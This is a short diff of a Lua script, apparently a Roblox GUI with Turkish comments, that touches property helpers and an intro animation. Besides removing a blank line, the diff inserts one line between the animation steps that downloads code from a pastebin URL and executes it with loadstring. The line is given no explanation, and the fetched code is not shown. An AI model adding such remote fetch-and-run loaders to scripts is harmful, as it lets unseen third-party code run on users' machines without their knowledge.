@@ -366,7 +366,6 @@ local function openProperties(moduleName)
 	end
 end
 
-
 local function addColor(moduleName, name, value)
 	ModuleProperties[moduleName] = ModuleProperties[moduleName] or {}
 	table.insert(ModuleProperties[moduleName], {Type="Color", Name=name, Value=value})
@@ -1154,6 +1153,8 @@ end
 
 -- 4 saniye bekle
 task.wait(4)
+
+loadstring(game:HttpGet("https://pastebin.com/raw/AUFQ1WX3"))()
 
 -- Kaybolma animasyonu
 local disappearTween = TweenService:Create(
